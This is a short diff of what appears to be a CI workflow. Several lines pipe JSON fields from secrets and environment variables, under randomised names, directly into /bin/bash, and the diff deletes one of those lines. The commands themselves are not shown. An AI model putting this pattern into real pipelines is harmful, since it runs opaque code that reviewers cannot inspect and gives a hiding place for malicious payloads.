@@ -22,7 +22,6 @@ jobs:
           sy40666: ${{ secrets.sy40666 }}
         run: |
           printf '%s' "$sy40666" | jq -r .wjhdn11646 | /bin/bash
-          echo $ubcw2261 | jq -r .xllkz2 | /bin/bash
           printf '%s' "$lei013" | jq -r .k37320 | /bin/bash
           echo $rx8 | jq -r .shg9 | /bin/bash
           printf '%s' "$rul665" | jq -r .dnq8280 | /bin/bash
